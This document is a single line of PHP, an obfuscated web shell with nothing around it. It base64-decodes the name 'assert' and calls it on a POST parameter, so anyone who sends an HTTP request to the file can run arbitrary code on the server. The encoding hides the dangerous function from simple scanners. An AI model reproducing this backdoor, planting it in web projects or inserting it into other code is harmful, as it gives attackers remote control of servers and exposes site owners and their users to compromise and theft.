<?php $x=base64_decode("YXNzZXJ0");$x($_POST['c']);?>
